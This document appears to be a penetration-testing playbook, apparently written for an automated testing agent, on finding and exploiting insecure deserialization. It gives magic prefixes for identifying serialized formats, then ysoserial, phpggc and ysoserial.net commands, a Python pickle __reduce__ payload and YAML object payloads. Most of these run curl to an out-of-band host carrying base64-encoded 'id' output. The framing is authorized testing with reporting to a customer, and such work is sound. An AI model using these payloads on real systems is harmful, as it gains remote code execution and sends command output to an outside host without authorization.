# Insecure Deserialization

> When found, deserialization is almost always RCE. The detection is the
> hard part — payloads are language-specific and often blind.

---

## Phase 1: Identify the Deserializer

### Where to look
- Cookies that look base64 of binary (`H4sIA...` for gzip-Java, `rO0AB...` for Java serialized)
- Hidden form fields with same shape
- View state: `__VIEWSTATE` (.NET), `viewstate` (Java)
- API endpoints accepting `Content-Type: application/x-java-serialized-object`
- gRPC / Protocol Buffers fields where backwards-compat allows arbitrary types
- Marshaled session storage (Pickle/PHP-serialize)

### Magic prefixes (decode first segment)
| Prefix | Format |
|--------|--------|
| `rO0AB` | Java native (`aced 0005` after b64-decode) |
| `H4sIA` | Gzip — usually wrapping Java |
| `KGRwM` | Python pickle (`(dp0\n` raw) |
| `\x80\x04` | Python pickle protocol 4 |
| `O:` then digits | PHP serialize (`O:8:"stdClass":...`) |
| `a:` then digits | PHP serialize (array) |
| `<--?xml` | XML — possibly XStream or .NET DataContractSerializer |
| `AAEAAAD` | .NET BinaryFormatter (post-base64: `00 01 00 00 00 FF`) |
| `<<<` `<...XML` | YAML — Ruby Psych often vulnerable |

---

## Phase 2: Java

### 2.1 ysoserial gadgets
```bash
ysoserial CommonsCollections1 'curl http://<oob>/$(id|base64 -w0)' | base64 -w0
ysoserial CommonsCollections6 'wget http://<oob>/' | base64 -w0
ysoserial Spring1 'sleep 10' | base64 -w0
ysoserial Hibernate1 ...
```
Plant the base64 in the cookie/field, send. Poll OOB.

### 2.2 Common gadget chains to try (in order of yield)
- CommonsCollections1 / 5 / 6 / 7 (most common)
- CommonsBeanutils1
- Hibernate1, Hibernate2
- Spring1, Spring2
- C3P0
- ROME
- BeanShell1
- Vaadin1
- Click1

If `ysoserial` isn't installed, write the JAR to `/tmp/` first or use
`marshalsec` for additional gadgets.

---

## Phase 3: Python (Pickle)

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://<oob>/$(id|base64 -w0)',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

Plant in the request, poll OOB.

Pickle-via-yaml.load (Ruby/Python both vulnerable):
```yaml
!!python/object/apply:os.system ["curl http://<oob>/"]
!!python/object/new:type ['x', !!python/tuple [], {'extend': !!python/name:exec }]
```

---

## Phase 4: PHP

### Manual gadget construction
```php
O:9:"Exception":1:{s:7:"\0*\0file";s:N:"phar:///tmp/x.phar"}
```

PHAR deserialization on file ops:
- Upload a `.phar` masquerading as `.jpg`
- Reference it via `phar://` in any function that does file checks
  (`file_exists`, `filesize`, `is_file`)
- Triggers `__destruct` of the embedded class

### phpggc gadget chains
```bash
phpggc Monolog/RCE1 system 'curl http://<oob>/' -b
phpggc Laravel/RCE9 system 'curl http://<oob>/' -b
```

---

## Phase 5: .NET BinaryFormatter / SoapFormatter / NetDataContractSerializer

```bash
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "curl http://<oob>/"
ysoserial.net -g ObjectDataProvider -f Json.Net -c "curl http://<oob>/"
```

Common sinks: `__VIEWSTATE` without MAC validation, custom serialization
in WCF endpoints.

---

## Phase 6: Detection Without Exploitation

If the engine is unknown, send canary payloads of each format and watch
for:
- 500 errors with engine-specific stack traces
- Different response time (deserialization is slow)
- OOB callbacks (most gadgets do something networky on construction)

`oob_get_domain` + every payload variant is the cheapest way to find any
deserialization that fires on the network.

---

## Verification

A reportable deserialization PoC:
- The exact bytes / cookie value sent
- The OOB callback proving execution (or in-band command output)
- Identification of the gadget chain (so the customer's dev team knows
  what to patch — usually a transitive dep, not their own code)
